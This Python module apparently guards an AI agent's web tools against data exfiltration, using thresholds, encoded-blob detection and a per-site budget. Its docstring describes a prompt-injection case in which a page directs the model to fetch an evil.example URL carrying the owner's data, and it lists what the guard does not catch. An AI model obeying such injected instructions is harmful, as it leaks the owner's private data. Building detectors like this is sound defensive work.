"""The exfil guard: a web call that looks like it carries data out comes to the owner as a card.

The room (docs/platform.md, «The room») holds the owner's Base and repositories and reads the open web. Its one way
for data to leave is the CLI's own web tools — Bash reaches only the platform and the code hosts — and the path of a
leak is: a page tells the model to fetch `https://evil.example/?d=<a piece of the Base>`. Auto mode's classifier
stands on that path; this is the second, cheap stand-in for the same scenario, not a wall. What binds, per address:
a long query, many params, a long path or host, a login in the address, and a run of encoded data — base64 or hex in
one piece, or base64 split by any punctuation (it is read with every separator taken out, escapes read twice) — card;
per run, a site (its registrable domain) that has taken more than a budget of path and query characters cards the
next address to it. What does not bind: plain words under every threshold and the budget, and hex or all-caps
base32 split into short pieces (case-unmixed text is a slug's, and stays exempt); those are the classifier's.

What it looks at is only what reaches another host: a `WebFetch` address — the host, the path, the query, a login in
the address (sent as a header) — never its fragment (no client sends it) or its `prompt` (the CLI's own summariser
reads it, on Anthropic's side); a `WebSearch` query, which leaves through the model API to the search provider.
The thresholds were set against ordinary research — search results, articles, docs, GitHub, Wikipedia in Russian,
a Booking or Maps link the model builds, Google Flights' and Airbnb's own structured params — so that none of those
cards (tests/test_exfil.py lists them).
"""

from __future__ import annotations

import re
from urllib.parse import unquote, urlsplit

# A query string longer than this, in characters once its escapes are read (Cyrillic is six to the letter on the
# wire), is a card. A model building a search or a booking link writes a few short params (`?q=…&checkin=…`), well
# under it; a paragraph of the owner's notes is over it.
QUERY_MAX = 200
# More params than this is a card: under QUERY_MAX, a payload split into many short values looks like this.
PARAMS_MAX = 12
# A run of encoded data this long — in a path segment, a param's name or value, a host label below — is a card:
# 48 bytes as base64, 32 as hex. A word, a slug, a document id (Google's are 44) are shorter or not shaped like it.
BLOB_MIN = 64
# The whole path, and the host: past these, data split into many short segments or labels.
PATH_MAX = 300
HOST_MAX = 80
LABEL_MAX = 40            # one DNS label (at most 63): a long one is a subdomain carrying data
# A search query longer than this is a card: a question is a sentence or two, not a page.
SEARCH_MAX = 300
# Per run, the path and query characters (escapes read) one site may take before the next address to it cards — the
# answer to a payload cut into pieces each under every threshold. A research session reads 20 to 40 pages of one site
# with paths of 40 to 80 characters (1 600 to 3 200); 6 000 leaves it room twice over, and a 200-character
# paragraph of the Base gets 30 tries. Counted on what passes; a card for it starts the site's count again.
SITE_BUDGET = 6000
# Joined text (separators out): base64-like when its letters are this share upper case or more — base64 is about a
# half, Title_Case and CamelCase words about a sixth.
UPPER_SHARE = 0.25
# Parameters that are another site's own structured state, not anyone's data: exempt from the count, the length and
# the encoded-run checks on that site only (the host is checked strictly: `google.evil.example` is not Google).
_CCTLD = r"(?:com|[a-z]{2}|co\.[a-z]{2}|com\.[a-z]{2})"
STRUCTURED = [
    (re.compile(rf"(?:[a-z0-9-]+\.)*google\.{_CCTLD}"), "/travel/", frozenset({"tfs", "tfu"})),
    (re.compile(rf"(?:[a-z0-9-]+\.)*airbnb\.{_CCTLD}"), "/", frozenset({
        "adults", "children", "infants", "pets", "checkin", "checkout", "check_in", "check_out", "guests",
        "search_type", "search_mode", "price_filter_input_type", "price_filter_num_nights", "price_min", "price_max",
        "channel", "ne_lat", "ne_lng", "sw_lat", "sw_lng", "zoom", "zoom_level", "search_by_map", "date_picker_type",
        "place_id", "query", "tab_id", "source", "refinement_paths[]", "flexible_trip_lengths[]",
        "monthly_start_date", "monthly_length", "monthly_end_date", "federated_search_session_id",
        "pagination_search", "cursor", "source_impression_id", "previous_page_section_name", "location_bb",
        "acp_id", "room_types[]", "amenities[]", "l2_property_type_ids[]", "min_bedrooms", "min_beds",
        "min_bathrooms", "photo_id", "category_tag", "selected_filter_order[]", "update_selected_filters"})),
]
# Two-label public suffixes common enough to matter for the budget's site (a registrable domain below them).
_SUFFIX2 = re.compile(r"(?:co|com|net|org|gov|edu|ac|or|ne|go)\.[a-z]{2}")

# Unbroken base64 / base32 / hex: no separator a slug would have.
_DENSE = re.compile(r"[A-Za-z0-9+/=]{" + str(BLOB_MIN) + ",}")
# base64url (it has `-` and `_`): long, and with a piece that mixes upper case, lower case and digits — what a slug
# of words, a Notion id (lower-case hex) or a Title_Case_Wiki_Name does not.
_URLSAFE = re.compile(r"[A-Za-z0-9_-]{" + str(BLOB_MIN) + ",}")
_PIECE = re.compile(r"[A-Za-z0-9]{16,}")
# Percent-escapes in a row: Cyrillic or Chinese text is written so, and stays unremarkable; escaped ASCII letters and
# digits (which nobody needs to escape) or bytes that are not UTF-8 are a payload.
_ESCAPES = re.compile(r"(?:%[0-9A-Fa-f]{2}){" + str(-(-BLOB_MIN // 3)) + ",}")
_ALNUM = re.compile(r"[A-Za-z0-9]")
_PUNCT = re.compile(r"[\x00-\x2f\x3a-\x40\x5b-\x60\x7b-\x7f\s]+")   # every ASCII separator, and spaces
_JOINED = re.compile(r"[A-Za-z0-9]{" + str(BLOB_MIN) + ",}")


def _mixed(piece: str) -> bool:
    return any(c.isupper() for c in piece) and any(c.islower() for c in piece) and any(c.isdigit() for c in piece)


def blob(text: str) -> int:
    """The length of the longest run in `text` that looks like encoded data; 0 when none does."""
    found = 0
    for run in _ESCAPES.findall(text):
        raw = bytes.fromhex(run.replace("%", ""))
        try:
            decoded = raw.decode("utf-8")
        except UnicodeDecodeError:
            decoded = None
        if decoded is None or _ALNUM.search(decoded) or any(ord(c) < 32 for c in decoded):
            found = max(found, len(run))
    plain = unquote(text, errors="replace")
    for run in _DENSE.findall(plain):
        found = max(found, len(run))
    for run in _URLSAFE.findall(plain):
        if any(_mixed(piece) for piece in _PIECE.findall(run)):
            found = max(found, len(run))
    return found


def joined(text: str) -> int:
    """The longest base64-like run in `text` read with its escapes undone twice and every ASCII separator taken out:
    data split across segments and params by `/ . - _ ~ , ! : ; = &` joins up again. Case-unmixed text is exempt —
    a slug of words joined is a long lower-case run — and so is text whose letters are mostly lower case."""
    plain = _PUNCT.sub("", unquote(unquote(text, errors="replace"), errors="replace"))
    found = 0
    for run in _JOINED.findall(plain):
        letters = [c for c in run if c.isalpha()]
        upper = sum(c.isupper() for c in letters)
        if letters and upper < len(letters) and upper / len(letters) >= UPPER_SHARE:
            found = max(found, len(run))
    return found


def _structured(host: str, path: str) -> frozenset[str]:
    for site, prefix, names in STRUCTURED:
        if site.fullmatch(host) and path.startswith(prefix):
            return names
    return frozenset()


def site(host: str) -> str:
    """The registrable domain the budget counts under: the last two labels, three below a common two-label suffix."""
    labels = host.lower().rstrip(".").split(".")
    take = 3 if len(labels) >= 3 and _SUFFIX2.fullmatch(".".join(labels[-2:])) else 2
    return ".".join(labels[-take:])


def counted(url: str) -> tuple[str, int]:
    """The site of an address and the path and query characters it carries, its structured params left out."""
    parts = urlsplit(url.strip())
    host = parts.hostname or ""
    exempt = _structured(host, parts.path)
    params = [pair for pair in re.split(r"[&;]", parts.query) if pair and pair.partition("=")[0] not in exempt]
    return site(host), len(unquote(parts.path, errors="replace")) + sum(len(unquote(p, errors="replace"))
                                                                        for p in params)


class Budget:
    """Per run, the path and query characters each site has taken (`SITE_BUDGET`). In memory: a restart of the
    platform starts every count again, as a new run does."""

    def __init__(self) -> None:
        self._spent: dict[str, dict[str, int]] = {}

    def over(self, run: str, tool: str, tool_input: dict) -> str:
        """The card's line when this fetch takes its site past the budget (the count then starts again); else the
        characters are spent and the answer is empty."""
        url = tool_input.get("url") if tool == "WebFetch" else None
        if not isinstance(url, str):
            return ""
        try:
            where, size = counted(url)
        except ValueError:
            return ""  # `why` cards an address it cannot read
        spent = self._spent.setdefault(run, {})
        if spent.get(where, 0) + size > SITE_BUDGET:
            spent[where] = 0
            return (f"Похоже на вынос данных: сайт {where} за этот ход получил больше {SITE_BUDGET} знаков в адресах "
                    "(путь и запрос). Прочитай адрес целиком")
        spent[where] = spent.get(where, 0) + size
        return ""

    def forget(self, run: str) -> None:
        self._spent.pop(run, None)


def _url_why(url: str) -> str:
    try:
        parts = urlsplit(url.strip())
        host = parts.hostname or ""
    except ValueError:
        return "адрес не разобрать"
    if parts.username is not None or parts.password is not None:
        return "в адресе логин или пароль — они уходят на сайт заголовком"
    if len(host) > HOST_MAX:
        return f"имя сайта — {len(host)} знаков (порог {HOST_MAX})"
    if label := next((label for label in host.split(".") if len(label) > LABEL_MAX), None):
        return f"в имени сайта часть из {len(label)} знаков (порог {LABEL_MAX})"
    exempt = _structured(host, parts.path)
    params = [pair.partition("=")[::2] for pair in re.split(r"[&;]", parts.query) if pair]  # raw: escapes kept
    params = [(name, value) for name, value in params if name not in exempt]
    query = unquote("&".join(f"{n}={v}" for n, v in params), errors="replace")  # in characters
    path = unquote(parts.path, errors="replace")
    if len(query) > QUERY_MAX:
        return f"строка запроса — {len(query)} знаков (порог {QUERY_MAX})"
    if len(params) > PARAMS_MAX:
        return f"параметров — {len(params)} (порог {PARAMS_MAX})"
    if len(path) > PATH_MAX:
        return f"путь — {len(path)} знаков (порог {PATH_MAX})"
    pieces = [*host.split("."), *parts.path.split("/"), *(text for pair in params for text in pair)]
    if size := max((blob(piece) for piece in pieces), default=0):
        return f"в адресе закодированный блок из {size} знаков"
    if size := joined(parts.path + "?" + "&".join(f"{n}={v}" for n, v in params)):
        return f"в адресе закодированный блок из {size} знаков, разбитый на части"
    return ""


def why(tool: str, tool_input: dict) -> str:
    """The card's line when this call looks like it carries data out; empty when it does not."""
    if tool == "WebFetch":
        url = tool_input.get("url")
        try:
            reason = _url_why(url) if isinstance(url, str) else "адрес не строка"
        except Exception:  # noqa: BLE001 — a hook that fails lets the call run: an address not read is a card
            reason = "адрес не разобрать"
        return f"Похоже на вынос данных: {reason}. Прочитай адрес целиком" if reason else ""
    if tool == "WebSearch":
        query = tool_input.get("query")
        if not isinstance(query, str):
            return ""
        if len(query) > SEARCH_MAX:
            reason = f"запрос — {len(query)} знаков (порог {SEARCH_MAX})"
        elif size := blob(query) or joined(query):
            reason = f"в запросе закодированный блок из {size} знаков"
        else:
            return ""
        return f"Похоже на вынос данных: {reason}. Прочитай запрос целиком"
    return ""
